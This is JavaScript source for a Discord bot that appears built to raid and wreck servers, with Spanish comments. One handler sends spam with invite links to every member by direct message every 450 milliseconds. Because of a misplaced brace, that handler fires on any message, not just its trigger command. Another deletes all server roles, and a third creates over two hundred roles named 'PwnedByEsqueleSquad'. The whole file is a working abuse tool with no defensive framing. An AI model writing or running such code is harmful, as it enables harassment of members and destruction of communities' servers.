client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".spammd")
                        message.delete()
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("Ahh shit they raided again ... https://imgur.com/KJHRZCW https://discord.gg/8z5GpNBC https://discord.gg/reRpxKGX Original Server: https://discord.gg/MmRckSge").catch(error => {});
                        },450);
                      })
                      });


//borrar roles

client.on("message", message => {


                    if (message.author.bot) return;
                  
                     if(message.content === ('.rolesdeleted')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });

//crear roles

client.on("message", message => {

                if (message.author.bot) return;
              
               if (message.content === '.roles') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                message.guild.roles.create({ data: { name: `PwnedByEsqueleSquad`, color: '#5e0c0c',},reason: 'razon',})
              };
               }
                });




